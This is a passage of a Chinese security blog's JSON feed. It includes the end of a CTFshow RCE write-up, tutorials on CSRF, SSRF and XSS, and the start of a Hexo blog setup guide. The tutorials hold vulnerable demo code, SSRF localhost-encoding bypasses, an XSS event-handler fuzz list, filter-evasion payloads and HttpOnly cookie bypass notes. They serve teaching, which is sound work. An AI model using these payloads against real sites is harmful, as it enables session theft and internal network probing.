*command);\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'/readflag > 1.txt'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$ffi</span><span class=\"token operator\">-></span><span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre></p>\n<p>再去访问 1.txt 即可</p>\n",
            "tags": [
                "CTFshow",
                "rce"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/31/CSRF&SSRF/",
            "url": "https://blog.xcu.icu/2022/10/31/CSRF&SSRF/",
            "title": "CSRF&SSRF",
            "date_published": "2022-10-30T16:00:00.000Z",
            "content_html": "<h2 id=\"csrf简介\"><a class=\"anchor\" href=\"#csrf简介\">#</a> CSRF 简介</h2>\n<p>CSRF 是指跨站请求伪造，跨站请求伪造（英语：Cross-site request forgery，也被称为 [one-click attack] 或者 [session riding]，通常缩写为 CSRF 或者 XSRF，是一种挟制用户在当前已登录的 Web 应用程序上执行非本意的操作的攻击方法。跟跨网站脚本（XSS）相比，XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</p>\n<p>扯那么多，简单的理解就是盗用了用户的身份，以用户的名义进行非法操作</p>\n<h2 id=\"csrf的工作原理\"><a class=\"anchor\" href=\"#csrf的工作原理\">#</a> CSRF 的工作原理</h2>\n<p>当我们打开一个网站后，我们的浏览器会与服务器产生一个会话，在这个会话中，我们可以正常的使用我们的权限对网站进行操作，比如登录博客可以删除或发布文章，当会话结束后，再进行这些操作时就会提示会话过期请重新登录。</p>\n<p>上述是我们正常的一个会话过程，而 CSRF 就是建立在会话上，比如我们登录网上银行转账的过程中，点击了一个攻击者构造的一个转账业务代码，那么我们账号中的余额就会被盗走，一直到现在说的都是 CSRF 的过程，那么为什么会这样呢，在浏览器与服务器的会话中所有的操作都被默认为是可信的所以执行了攻击者构建的转账代码</p>\n<h3 id=\"漏洞形成条件\"><a class=\"anchor\" href=\"#漏洞形成条件\">#</a> 漏洞形成条件</h3>\n<ol>\n<li>CSRF 攻击建立在会话下</li>\n<li>欺骗用户访问 url</li>\n</ol>\n<h2 id=\"csrf攻击\"><a class=\"anchor\" href=\"#csrf攻击\">#</a> CSRF 攻击</h2>\n<p>CSRF 攻击是攻击者通过受害者的 cookie 骗取服务器的信任，但是攻击者并没有获取到 Cookie，也看不到 Cookie 信息。另外，由于浏览器同源策略的限制，黑客无法从返回的结果中得到任何信息，CSRF 所能做的就是给服务器发送请求</p>\n<h2 id=\"csrf防御\"><a class=\"anchor\" href=\"#csrf防御\">#</a> CSRF 防御</h2>\n<p>CSRF 漏洞的预防没有其他漏洞那么麻烦，只需要在一些地方增加一些小操作就好</p>\n<h3 id=\"二次确认token验证\"><a class=\"anchor\" href=\"#二次确认token验证\">#</a> 二次确认 &amp; token 验证</h3>\n<p>在调用某些功能时进行二次验证，比如删除用户时，产生提示对话框，需要二次确认，再如转账时需要再次输入密码</p>\n<h2 id=\"ssrf简介\"><a class=\"anchor\" href=\"#ssrf简介\">#</a> SSRF 简介</h2>\n<p>多数 web 应用都提供了从其他服务器获取数据的功能，根据用户指定的 url 来下载文件，读取文件等。如果这种功能被恶意利用，那么就有可能导致存在缺陷的 web 应用被作为跳板去攻击本地或者远程服务器，这种形式的攻击被称为 SSRF</p>\n<h2 id=\"ssrf形成原理\"><a class=\"anchor\" href=\"#ssrf形成原理\">#</a> SSRF 形成原理</h2>\n<p>SSRF 的主要形成原理是服务端提供了从其他服务器获取数据的功能，但是没有对目标地址进行有效的过滤或者限制导致的。</p>\n<p>demo</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$url</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'url'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>原本是用来获取图片返回给用户的，但是构造</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">url&#x3D;http:&#x2F;&#x2F;127.0.0.1:8000<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>就可以探测 8000 端口的开放情况</p>\n<h2 id=\"防护绕过\"><a class=\"anchor\" href=\"#防护绕过\">#</a> 防护绕过</h2>\n<p>防护主要是对请求进行过滤</p>\n<ol>\n<li>设置白名单</li>\n<li>禁止请求内网 ip</li>\n</ol>\n<p>绕过也不难</p>\n<ol>\n<li>使用 http://example.com@eval.com 这种格式绕过正则</li>\n<li>使用其他进制，或者是简写 ip\n<ul>\n<li>0177.00.00.01（八进制）</li>\n<li>2130706433 (十进制)</li>\n<li>0x7f.0x0.0x0.1x0.0x1（十六进制）</li>\n<li>127.1</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"利用\"><a class=\"anchor\" href=\"#利用\">#</a> 利用</h2>\n<h3 id=\"端口扫描\"><a class=\"anchor\" href=\"#端口扫描\">#</a> 端口扫描</h3>\n<p>访问内网 ip 加端口号，根据响应时间回显来判断端口是否开放</p>\n<h3 id=\"指纹识别\"><a class=\"anchor\" href=\"#指纹识别\">#</a> 指纹识别</h3>\n<p>大部分 web 应用有一些独特的文件或者目录，可以通过这些特征来判断应用类型，详细版本，以此更好的进行漏洞利用</p>\n<h3 id=\"文件读取\"><a class=\"anchor\" href=\"#文件读取\">#</a> 文件读取</h3>\n<p>配合 file 伪协议，可以读取敏感文件</p>\n",
            "tags": [
                "Web",
                "web"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/29/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/",
            "url": "https://blog.xcu.icu/2022/10/29/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/",
            "title": "XSS跨站脚本攻击",
            "date_published": "2022-10-28T16:00:00.000Z",
            "content_html": "<h1 id=\"xss跨站脚本攻击\"><a class=\"anchor\" href=\"#xss跨站脚本攻击\">#</a> XSS 跨站脚本攻击</h1>\n<p>xss 也叫 css 为了和层叠样式表（Cascading Style Sheets，CSS）的缩写区分。因此将跨站脚本攻击缩写为 XSS。</p>\n<p>xss 攻击是指攻击者在网页中嵌入客户端脚本，通常是 js 代码，在用户访问时，恶意代码执行</p>\n<h1 id=\"原理刨析\"><a class=\"anchor\" href=\"#原理刨析\">#</a> 原理刨析</h1>\n<p>攻击者可以通过一些方式向网页中写入恶意代码，导致用户在加载网页时浏览器渲染执行了恶意脚本</p>\n<p>上面提到 xss 攻击是嵌入客户端脚本，大多数是 js，少部分使用 AS 和 VBS，那么也就是说在能够利用漏洞的情况下，js 能做到什么效果，xss 的利用就能做到什么效果</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">javaScript加载外部的代码文件可以是任意文件扩展名，即使是图片扩展名只要包含js代码就能执行<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<h1 id=\"xss分类\"><a class=\"anchor\" href=\"#xss分类\">#</a> xss 分类</h1>\n<p>主要被分为三种，反射型，储存型和 DOM 型，接下来详细说明</p>\n<h3 id=\"反射型\"><a class=\"anchor\" href=\"#反射型\">#</a> 反射型</h3>\n<p>首先，先盗个图</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025215134992.png\" alt=\"image-20221025215134992\" /></p>\n<p>反射型 xss 也被称为非持久型的 xss，反射型 xss 是当先最常见的一种 xss 漏洞。攻击者将带有 xss 恶意脚本的连接发给用户诱导其点击，用户向服务器请求了一个带有 xss 脚本的 url 请求，服务器返回给浏览器，浏览器解析 xss 脚本区访问了恶意服务器造成漏洞</p>\n<p>demo</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$name</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Hello <span class=\"token interpolation\"><span class=\"token variable\">$name</span></span>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>服务端对用户的 name 没有进行过滤，服务器解析后通过 echo 插入到 HTML 中</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025221057624.png\" alt=\"image-20221025221057624\" /></p>\n<p>这里插入 js，便可执行</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025221207814.png\" alt=\"image-20221025221207814\" /></p>\n<h3 id=\"存储型\"><a class=\"anchor\" href=\"#存储型\">#</a> 存储型</h3>\n<p>还是先盗个图（我发四，本篇最后一张）</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025220126444.png\" alt=\"image-20221025220126444\" /></p>\n<p>刚刚说到反射型也叫非持久性，那么存储型就是持久型 xss，与 xss 的区别就是提交的 xss 代码是否会被存储在服务端，下次访问到这个页面时还会执行恶意脚本。（存储型 xss 不在是攻击者诱导受害者点击连接，而是将 xss 脚本留在目标服务器上，当受害者访问了存有 xss 脚本的页面时就受到了攻击，允许用户进行数据存储的地方都有可能存在 xss 漏洞，这种 xss 攻击比反射型危害更大。）</p>\n<p>demo</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt;?php\necho &quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;&#x2F;script&gt;&quot;;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre></p>\n<p>保存到文件中，每次访问时都会执行</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025221521051.png\" alt=\"image-20221025221521051\" /></p>\n<h3 id=\"dom型\"><a class=\"anchor\" href=\"#dom型\">#</a> DOM 型</h3>\n<p>个人理解其实也算是反射型，但是 DOM 型的 xss 不需要与服务端交互，仅仅发生在客户端处理数据的阶段，DOM 全称 Document Object Model（文档对象模型），对于浏览器来说 DOM 就是一份 xml，JavaScript 重构 HTML 页面的过程中使用 DOM 提供结构化表示，DOM 规定 HTML 中每个成分都是一个结点</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">DOM规定：\n整个文档是一个文档结点\n每一个HTML标签是一个元素结点\n包含在HTML元素中的文本是文本结点\n每个HTML属性是一个属性结点\n结点与结点之间都有等级关系<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>HTML DOM 树</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221025224329456.png\" alt=\"image-20221025224329456\" /></p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">可能触发DOM型XSS的属性\ndocument.referer属性\n\nwindow.name属性\n\nlocation属性\n\ninnerHTML属性\n\ndocumen.write属性<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<h4 id=\"dom型xss利用原理\"><a class=\"anchor\" href=\"#dom型xss利用原理\">#</a> DOM 型 xss 利用原理</h4>\n<p>利用前提是 js 可以访问 DOM 文本对象模型，如果客户端代码中有 xss 脚本诱导用户点击可以使得用户访问自己构造的 url，达到和反射型类似的效果，因其不与服务器进行交互，可以用来绕过 waf</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\"><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n    <span class=\"token keyword\">var</span> tem <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token constant\">URL</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 获取当前页面的 URL</span>\n    <span class=\"token keyword\">var</span> index <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token constant\">URL</span><span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"content=\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 获取 content = 后面的内容</span>\n    <span class=\"token keyword\">var</span> par <span class=\"token operator\">=</span> tem<span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 获取参数</span>\n    document<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token function\">decodeURI</span><span class=\"token punctuation\">(</span>par<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//decodeURI () 解码 // 输出参数</span>\n</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221026213845778.png\" alt=\"image-20221026213845778\" /></p>\n<h1 id=\"xss的检测\"><a class=\"anchor\" href=\"#xss的检测\">#</a> Xss 的检测</h1>\n<p>检测 xss 主要有两种方法，一种是手工检测，一种是通过自动化工具检测，个人感觉两种方法没有先后各有利弊吧。手工检测的精度更高，但是当一个 web 应用程序过于庞大的情况，手工检测是非常困难的，用工具自动化检测精度相对要低上不少</p>\n<h3 id=\"手工检测xss\"><a class=\"anchor\" href=\"#手工检测xss\">#</a> 手工检测 xss</h3>\n<p>手工检测时，主要考虑有输出和能够存储的地方进行测试，可以尝试使用特征明显的字符来进行测试</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">&lt; &gt; &quot;  &#39; ( )等字符<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>同时携带上如 AAAAAAA 字便于查找插入到 HTML 中的位置</p>\n<h3 id=\"xss工具\"><a class=\"anchor\" href=\"#xss工具\">#</a> Xss 工具</h3>\n<p>这里工具很多不再一一赘述，推荐去 GitHub 上寻找开源的工具</p>\n<h1 id=\"xss的利用种类\"><a class=\"anchor\" href=\"#xss的利用种类\">#</a> Xss 的利用种类</h1>\n<p>在一些情况下 xss 漏洞的危害不亚于 sql 注入，常见的利用方法：</p>\n<ul>\n<li>盗取用户 cookie</li>\n<li>修改网页内容</li>\n<li>网站挂马</li>\n<li>利用网站重定向</li>\n<li>xss 蠕虫</li>\n</ul>\n<h3 id=\"xss会话劫持\"><a class=\"anchor\" href=\"#xss会话劫持\">#</a> xss 会话劫持</h3>\n<p>这里多数是指劫持 cookie 或 session 达到目的</p>\n<h4 id=\"cookie\"><a class=\"anchor\" href=\"#cookie\">#</a> cookie</h4>\n<p>cookie 是一种能够将少量文本存储到客户端的磁盘、内存上面或者从客户端的内存、磁盘上面读取的一种技术</p>\n<p>一位我尊敬的师长说过，每一种技术或者协议的产生都是由需求驱动的，cookie 的产生主要是为了解决 http 协议的无状态，web 服务器需要额外的数据用于维持会话，cookie 正是一一段随 http 请求的响应的额外数据，他的主要作用是标识用户维持会话</p>\n<p>cookie 主要分为持久 cookie 和非持久 cookie，这两种分类的主要区别就是持久 cookie 是存储到客户端的磁盘中的只有到了过期时间或者手动删除才会失效，非辞旧 cookie 是存储到客户端的内存上的，浏览器关闭后就会消失</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">cookie一般会经过加密，只有服务器的处理程序才知道cookie的含义<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>部分开发者将 cookie 作为用户的标识，那么我们就可以通过劫持 cookie 来登录账号，而部分开发者不会将 cookie 当作用户的标识，而是储存一些临时信息，那么我们拿到 cookie 也是没用的</p>\n<h4 id=\"session\"><a class=\"anchor\" href=\"#session\">#</a> session</h4>\n<p>除去 cookie 外维持会话的另一种形式就是 session，session 在网络应用中被称为会话是一种服务端的机制，我们打开网站到关闭浏览器这段时间被称为会话，如果我们在服务端与客户端的会话没结束时就拿到 session 就能做到劫持会话的效果</p>\n<h1 id=\"xss漏洞攻与防\"><a class=\"anchor\" href=\"#xss漏洞攻与防\">#</a> xss 漏洞攻与防</h1>\n<p>xss 跨站脚本漏洞的根本原因还是开发者对用户的输入输出没有进行严格的过滤，而导致的客户端脚本被浏览器正常执行导致，这也就意味着如果我们能够将敏感字符过滤就能够修补 xss 漏洞</p>\n<h3 id=\"特定的标签过滤\"><a class=\"anchor\" href=\"#特定的标签过滤\">#</a> 特定的标签过滤</h3>\n<p>部分开发者认为将危险的标签过滤掉就不会执行 js 脚本，但是实际上任何一种标签无论是否合法都能够正常执行 js 脚本</p>\n<p><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token operator\">&lt;</span>not_real_tag onclick<span class=\"token operator\">=</span><span class=\"token string\">\"alert(/xss/)\"</span> <span class=\"token operator\">></span>click me<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>not_real_tag<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>像这样构造也能正常执行 xss 脚本，也就是说如果输出点在 HTML 标签中或者 js 脚本中，那么我们可以通过简单的闭合拼接属性那么就可以成功执行 xss</p>\n<h3 id=\"事件过滤\"><a class=\"anchor\" href=\"#事件过滤\">#</a> 事件过滤</h3>\n<p>很多时候开发者者会选择过滤事件来防止 xss，但是不排除有漏网之鱼，这里可以 fuzz 尝试</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">Fuzz字典分享:\nonafterprint\noninput\nonscrol1\nonbeforeprint\noninvalid\nonabort\nonbeforeunload\nonreset\noncanplay\nonerror\nonselect\noncanplaythrough\nonhaschange\nonsubmit\nondurationchange\nonload\nonkeydown\nonemptied\nonmessage\nonkeypress\nonended\nonoffline\nonkeyup\nonerror\nononline\nonclick\nonloadeddata\nonpagehide\nondblclick\nonloadedmetadata\nonpageshow\nondrag\nonloadstart\nonpopstate\nondragend\nonpause\nonredo\nondragenter\nonplay\nonresize\nondragleave\nonplaying\nonstorage\nondragover\nonprogress\nonundo\nondragstart\nonratechange\nonunload\nondrop\nonreadystatechange\nonblur\nonmous edown\nonseeked\nonchange\nonmous emove\nonseeking\noncontextmenu\nonmouseout\nonstalled\nonfocus\nonmouseover\nonsuspend\nonformchange\nonmouseup\nontimeupdate\nonforminput\nonmousewheel\nonvolumechange<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>同样还有一些不属于事件属性，但可以用于执行 js 代码，比如常见的 js 伪协议</p>\n<p><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token operator\">&lt;</span>a herf<span class=\"token operator\">=</span><span class=\"token string\">\"javascript:alert(/xss/)\"</span><span class=\"token operator\">></span>click me <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<h3 id=\"敏感字符的过滤\"><a class=\"anchor\" href=\"#敏感字符的过滤\">#</a> 敏感字符的过滤</h3>\n<p>在 html 中，&lt;&gt;&quot; 和 '&amp; 都有特殊的意义，HTML 的标签属性就是由这几个字符组成的，如果直接输出可能会导致整个 HTML 文档的结构，所以我们通常情况将这些字符转义，比如 php 提供了 htmlspeciachars 和 htmlentities 两个函数把一些预定字符转义转换成 HTML 实体</p>\n<ul>\n<li>(&amp;) 成为 &amp; amp</li>\n<li>(&quot;) 成为 &amp; quot</li>\n<li>(') 成为 &amp;#039</li>\n<li>(&lt;) 成为 &amp; lt</li>\n<li>(&gt;) 成为 &amp; gt</li>\n</ul>\n<p>关键字过滤其实大部分是针对敏感变量或者函数进行的，如 eval，cookie 等，这部分的过滤可以通过字符串拼接，编码解码等方法绕过</p>\n<h4 id=\"字符串拼接混淆\"><a class=\"anchor\" href=\"#字符串拼接混淆\">#</a> 字符串拼接混淆</h4>\n<p>js 中的对象方法可以通过数组的方式进行调用，比如调用 alert 函数</p>\n<p><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">window<span class=\"token punctuation\">[</span><span class=\"token string\">'alert'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">xss</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>这里数组的下标是先要调用函数名字的字符串，既然说是字符串那么就可以通过字符串拼接的方式</p>\n<p><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">window<span class=\"token punctuation\">[</span><span class=\"token string\">'al'</span><span class=\"token operator\">+</span><span class=\"token string\">'ert'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">xss</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>或者通过 js 自带的 base 编码来实现字符串的绕过</p>\n<p><pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\">window<span class=\"token punctuation\">[</span><span class=\"token function\">atob</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"YWxl\"</span><span class=\"token operator\">+</span><span class=\"token string\">\"cnQ=\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">xss</span><span class=\"token regex-delimiter\">/</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<h4 id=\"编码解码\"><a class=\"anchor\" href=\"#编码解码\">#</a> 编码解码</h4>\n<p>基于字符串的代码混淆不仅可以通过字符串拼接的方式，还可以通过各种编码的方式，常用的有：</p>\n<ul>\n<li>HTML 进制编码</li>\n<li>css 进制编码</li>\n<li>js 进制编码</li>\n<li>url 编码</li>\n<li>jsfuck 编码（一种只有<a href=\"\"></a>！+6 个字符来编写 js 程序）</li>\n</ul>\n<h4 id=\"locationwindowname\"><a class=\"anchor\" href=\"#locationwindowname\">#</a> location*,<span class=\"exturl\" data-url=\"aHR0cDovL3dpbmRvdy5uYW1l\">window.name</span></h4>\n<p>既然开发者会对输入的敏感字符进行过滤，可以将 xss 脚本放到不会交付到服务端的部分</p>\n<h4 id=\"过滤\"><a class=\"anchor\" href=\"#过滤\">#</a> 过滤 &quot;.&quot;</h4>\n<p>事件拼接都由点组成，可以过滤点来防御</p>\n<p>但是在 js 中可以用 with 关键字设置变量的作用域。利用这个特性可以绕过点的过滤</p>\n<p>with(document)with(cookie)</p>\n<h4 id=\"过滤-2\"><a class=\"anchor\" href=\"#过滤-2\">#</a> 过滤 &quot;()&quot;</h4>\n<p>js 脚本中调用对象方法要使用 (), 使用 throw 关键字传递阐述可以绕过限制</p>\n<p>window.onerror=alert; throw 1;</p>\n<h4 id=\"过滤空格\"><a class=\"anchor\" href=\"#过滤空格\">#</a> 过滤空格</h4>\n<p>在标签属性间可以通过换行符 0x09、0x10、0x12、0x13、0x0a 等字符代替空格绕过过滤</p>\n<p>&lt;img%0asrc=x%0aonerror=alert(/xss/)&gt;</p>\n<p>在标签名称和第一个属性间也可以使用 &quot;/&quot; 代替空格</p>\n<p>&lt;input/onfocus=alert(/xss/)&gt;</p>\n<h3 id=\"httponly绕过\"><a class=\"anchor\" href=\"#httponly绕过\">#</a> HTTPonly 绕过</h3>\n<p>HTTPonly 是 cookie 的一个安全属性，设置后可以防止 xss 漏洞产生的时候避免 js 脚本获取到 cookie</p>\n<h4 id=\"cve-2012-0053\"><a class=\"anchor\" href=\"#cve-2012-0053\">#</a> cve-2012-0053</h4>\n<p>Apache 服务器在 2.2.0-2.2.21 版本中存在一个漏洞，我们可以通过向网站植入一个超大的 cookie，令其 HTTP 头超过 Apache 的最大请求长度（4192 字节），使得 apache 返回 400 错误，状态也中包含了 HTTPonly 保护的 Cookie</p>\n<h4 id=\"phpinfo页面\"><a class=\"anchor\" href=\"#phpinfo页面\">#</a> phpinfo 页面</h4>\n<p>无论设置是否设置了 HTTPonly 在 phpinfo 中都能看到 Cookie</p>\n",
            "tags": [
                "Web",
                "XSS"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/10/25/hexo+github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/",
            "url": "https://blog.xcu.icu/2022/10/25/hexo+github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/",
            "title": "hexo+github搭建个人博客",
            "date_published": "2022-10-24T16:00:00.000Z",
            "content_html": "<p>应邀搭建一个小博客，hexo+github 搭建方便（重点是可以白嫖）</p>\n<h3 id=\"环境配置\"><a class=\"anchor\" href=\"#环境配置\">#</a> 环境配置</h3>\n<p>安装 node.js----<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub2RlanMub3JnL2VuLw==\">Node.js 官网</span></p>\n<p>安装完成后，使用命令 node -v，出现下面的信息则证明安装成功</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007204221944.png\" alt=\"image-20221007204221944\" /></p>\n<p>安装 git</p>\n<p>安装成功后执行命令 git --version</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007204532427.png\" alt=\"image-20221007204532427\" /></p>\n<p>GitHub 上面建立新的储存库</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007211507554.png\" alt=\"image-20221007211507554\" /></p>\n<p>这里有个地方需要注意，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS00Z3FhMDY3YmJhMjQ0Z3NsYTU4MGJkd2hlYTQ0NDlhYzE5Yi5naXRodWIuaW8=\">一是名字一定要是用户名.github.io</span> (不然会有很多问题)</p>\n<p>进入建好的项目的设置按钮中</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007212119905.png\" alt=\"image-20221007212119905\" /></p>\n<p>打开这个链接就已经有部署到网络上面的网页</p>\n<h3 id=\"安装hexo\"><a class=\"anchor\" href=\"#安装hexo\">#</a> 安装 hexo</h3>\n<p>创建一个文件夹存放部署在本地的文件，我这里选择放在 F 盘</p>\n<p>在 dos 命令框中输入</p>\n<ul>\n<li>\n<p>npm install hexo -g，开始安装 Hexo</p>\n</li>\n<li>\n<p>漫长等待安装完成后，输入 hexo 检查是否安装成功</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007214045244.png\" alt=\"image-20221007214045244\" /></p>\n</li>\n<li>\n<p>输入 hexo init 初始化文件夹（这个更慢，很烦下完两局象棋才结束）</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007214356434.png\" alt=\"image-20221007214356434\" /></p>\n</li>\n<li>\n<p>输入 npm install，安装组件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221007214417379.png\" alt=\"image-20221007214417379\" /></p>\n</li>\n<li>\n<p>输入 hexo s 开启服务器，访问该网址</p>\n</li>\n</ul>\n<h3 id=\"git绑定github账号\"><a class=\"anchor\" href=\"#git绑定github账号\">#</a> Git 绑定 GIthub 账号</h3>\n<p>在 blog 